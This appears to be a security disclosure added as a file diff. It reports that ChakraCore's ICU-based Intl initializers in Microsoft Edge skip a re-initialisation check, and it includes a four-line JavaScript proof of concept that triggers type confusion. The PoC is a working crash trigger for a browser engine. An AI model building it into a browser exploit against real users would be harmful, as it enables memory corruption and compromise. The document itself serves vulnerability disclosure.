@@ -1,0 +1,18 @@
+/*
+The InitializeNumberFormat function in Intl.js is used to initialize an Intl.NumberFormat object, and InitializeDateTimeFormat is used for an Intl.DateTimeFormat object. There are two versions of each initializer. One is for WinGlob and the other is for ICU. The problem is that the versions for ICU don't check whether the given object has been initialized. This allows to initialize the same object multiple times which can lead to type confusion.
+
+It seems the recent version of Edge in Windows Insider Preview has started to use ICU. Tested on Microsoft Edge 42.17672.1000.0 and Microsoft EdgeHTML 17.17672.
+
+The initializer for ICU has no check:
+https://github.com/Microsoft/ChakraCore/blob/bc2e55a7d80338ee4c9c63b76893f6d816dfe70b/lib/Runtime/Library/InJavascript/Intl.js#L1151
+
+The initializer for WinGlob has a check:
+https://github.com/Microsoft/ChakraCore/blob/bc2e55a7d80338ee4c9c63b76893f6d816dfe70b/lib/Runtime/Library/InJavascript/Intl.js#L3046
+
+PoC:
+*/
+
+let object = {};
+Intl.NumberFormat.apply(object);
+Intl.DateTimeFormat.apply(object);
+Intl.DateTimeFormat.prototype.formatToParts.apply(object);
